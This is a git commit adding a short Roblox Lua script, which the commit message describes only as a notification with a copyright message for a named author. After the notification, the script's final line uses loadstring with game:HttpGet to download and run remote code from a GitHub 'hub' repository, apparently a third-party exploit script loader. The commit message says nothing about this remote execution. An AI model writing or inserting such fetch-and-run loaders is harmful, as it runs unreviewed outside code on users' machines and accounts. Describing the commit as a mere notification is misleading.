44f6cc91c3064ac85703d2163671833672ed4879
bblhieu-spec <bblhieu@gmail.com>
2026-06-16 17:10:47 +0700

    Add notification script with copyright message

---
+++ hung script.lua
@@ -0,0 +1,8 @@
+-- Bản quyền thuộc về Ngô Ngọc Hùng --
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Hệ Thống",
+    Text = "Bản quyền thuộc về Ngô Ngọc Hùng",
+    Duration = 6
+})
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AnDepZaiHub/AnDepZaiHubBeta/refs/heads/main/AnDepZaiHubBeta.lua"))()
